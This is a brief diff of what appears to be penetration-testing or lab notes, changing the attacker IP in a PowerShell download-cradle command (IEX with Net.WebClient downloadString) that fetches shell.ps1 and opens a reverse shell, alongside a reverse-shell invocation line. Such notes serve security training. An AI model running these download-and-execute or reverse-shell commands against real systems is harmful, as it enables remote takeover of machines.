@@ -15,7 +15,7 @@ nop -Reverse -IPAddress 10.10.14.28 -Port 4243
 this line at the end of shell.ps1
 
 # this is what gets us the reverse shell
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28:81/shell.ps1')"
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.64:81/shell.ps1')"
 ```
 
 smbserver or powershell download file
